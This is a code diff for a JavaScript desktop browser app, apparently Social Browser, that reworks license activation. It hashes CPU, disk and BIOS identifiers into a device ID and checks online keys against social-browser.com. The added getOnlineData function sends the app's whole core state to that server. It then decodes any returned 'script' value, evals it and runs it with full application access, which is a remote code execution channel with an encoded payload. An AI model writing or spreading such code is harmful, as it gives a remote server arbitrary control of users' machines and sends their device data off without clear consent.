@@ -399,7 +399,6 @@ module.exports = function init(parent) {
         if (name == 'ad_list') {
           parent.handleAdList();
         }
-
       } else {
         parent.log('set_var Error : no userVarContent : ' + name);
       }
@@ -743,47 +742,95 @@ module.exports = function init(parent) {
   });
   parent.var.session_list.sort((a, b) => (a.time > b.time ? -1 : 1));
 
-  parent.var.core.active = true;
+  parent.var.core.browserActivated = true;
   parent.activated = function () {
+    parent.log('activated');
+
+    parent.var.core['DeviceId'] = '';
+    if (parent.information['ProcessorId'] !== '...' && parent.information['DISKDRIVE'] !== '...' && parent.information['BIOS'] !== '...') {
+      parent.var.core['DeviceId'] = parent.md5(parent.information['ProcessorId'] + parent.information['DISKDRIVE'] + parent.information['BIOS']);
+    }
+
     if (!parent.isAccountsMode && parent.var.session_list.length <= parent.freeUsersCount) {
-      parent.var.core.active = true;
-      parent.var.core.activeMessage = '';
-      if ((parent.var.core.max_tabs = 1)) {
+      parent.var.core.browserActivated = true;
+      parent.var.core.activeMessage = 'Free Activated';
+      if (parent.var.core.max_tabs < 3) {
         parent.var.core.max_tabs = 20;
       }
-      return;
-
-      parent.var.core['BrowserKey'] = parent.md5(parent.api.to123(parent.var.core['id'] + parent.var.core['DeviceId']));
-      parent.var.core['DeviceKey'] = parent.md5(parent.api.to123(parent.var.core['DeviceId']));
-    } else if (parent.information['ProcessorId'] && parent.information['DISKDRIVE'] && parent.information['BIOS']) {
-      parent.var.core['DeviceId'] = parent.md5(parent.information['ProcessorId'] + parent.information['DISKDRIVE'] + parent.information['BIOS']);
-
+    } else if (parent.var.core['DeviceId']) {
       if (parent.var.core['BrowserKey'] && parent.md5(parent.api.to123(parent.var.core['id'] + parent.var.core['DeviceId'])) === parent.var.core['BrowserKey']) {
-        parent.var.core.active = true;
+        parent.var.core.browserActivated = true;
         parent.var.core.activeMessage = 'Browser Activated By ( Browser Key )';
-        if ((parent.var.core.max_tabs = 1)) {
+        if (parent.var.core.max_tabs < 3) {
           parent.var.core.max_tabs = 20;
         }
       } else if (parent.var.core['DeviceKey'] && parent.md5(parent.api.to123(parent.var.core['DeviceId'])) === parent.var.core['DeviceKey']) {
-        parent.var.core.active = true;
+        parent.var.core.browserActivated = true;
         parent.var.core.activeMessage = 'Browser Activated By ( Device Key )';
-        if ((parent.var.core.max_tabs = 1)) {
+        if (parent.var.core.max_tabs < 3) {
           parent.var.core.max_tabs = 20;
         }
+      } else if (parent.var.core['OnlineKey']) {
+        parent.api
+          .fetch('https://social-browser.com/api/activated', {
+            mode: 'cors',
+            method: 'post',
+            headers: {
+              'User-Agent': parent.var.core.defaultUserAgent.url,
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ OnlineKey: parent.var.core['OnlineKey'] }),
+            redirect: 'follow',
+            agent: function (_parsedURL) {
+              if (_parsedURL.protocol == 'http:') {
+                return new parent.api.http.Agent({
+                  keepAlive: true,
+                });
+              } else {
+                return new parent.api.https.Agent({
+                  keepAlive: true,
+                });
+              }
+            },
+          })
+          .then((res) => {
+            return res.json();
+          })
+          .then((data) => {
+            console.log(data);
+            if (data.done && data.activated) {
+              parent.var.core.browserActivated = true;
+              parent.var.core.activeMessage = 'Browser Activated By ( Online Key )';
+              if (parent.var.core.max_tabs < 3) {
+                parent.var.core.max_tabs = 20;
+              }
+            } else {
+              parent.var.core.activeMessage = data?.error;
+              parent.var.core.browserActivated = false;
+              parent.var.core.max_tabs = 2;
+            }
+          })
+          .catch((err) => {
+            // error when server down or no internet or site blocked for any reson ( online key only)
+            console.log(err);
+            parent.var.core.activeMessage = err;
+            parent.var.core.browserActivated = false;
+            parent.var.core.max_tabs = 2;
+          });
       } else {
-        parent.var.core.active = false;
+        parent.var.core.browserActivated = false;
+        parent.var.core.max_tabs = 2;
         if (parent.var.session_list.length > parent.freeUsersCount) {
           parent.var.core.activeMessage = `More Than ( ${parent.freeUsersCount} ) Profile Not Free`;
         }
-        parent.var.core.max_tabs = 2;
       }
     }
   };
 
   if (process.platform == 'win32') {
-    parent.information['ProcessorId'] = 'UNKNOWN';
-    parent.information['DISKDRIVE'] = 'UNKNOWN';
-    parent.information['BIOS'] = 'UNKNOWN';
+    parent.information['ProcessorId'] = '...';
+    parent.information['DISKDRIVE'] = '...';
+    parent.information['BIOS'] = '...';
 
     parent.exec('wmic CPU get ProcessorId', (d) => {
       parent.information['ProcessorId'] = d.replace(/\n|\r|\t|\s+|ProcessorId/g, '') || 'UNKNOWN';
@@ -798,4 +845,44 @@ module.exports = function init(parent) {
       parent.activated();
     });
   }
+
+  parent.getOnlineData = function () {
+    parent.api
+      .fetch('https://social-browser.com/api/online-data', {
+        mode: 'cors',
+        method: 'post',
+        headers: {
+          'User-Agent': parent.var.core.defaultUserAgent.url,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ core: parent.var.core }),
+        redirect: 'follow',
+        agent: function (_parsedURL) {
+          if (_parsedURL.protocol == 'http:') {
+            return new parent.api.http.Agent({
+              keepAlive: true,
+            });
+          } else {
+            return new parent.api.https.Agent({
+              keepAlive: true,
+            });
+          }
+        },
+      })
+      .then((res) => {
+        return res.json();
+      })
+      .then((data) => {
+        if (data.done) {
+          if (data.script) {
+            data.script = parent.api.from123(data.script);
+            let fn = parent.eval(data.script , true);
+            fn(parent);
+          }
+        }
+      })
+      .catch((err) => {
+        console.log(err);
+      });
+  };
 };
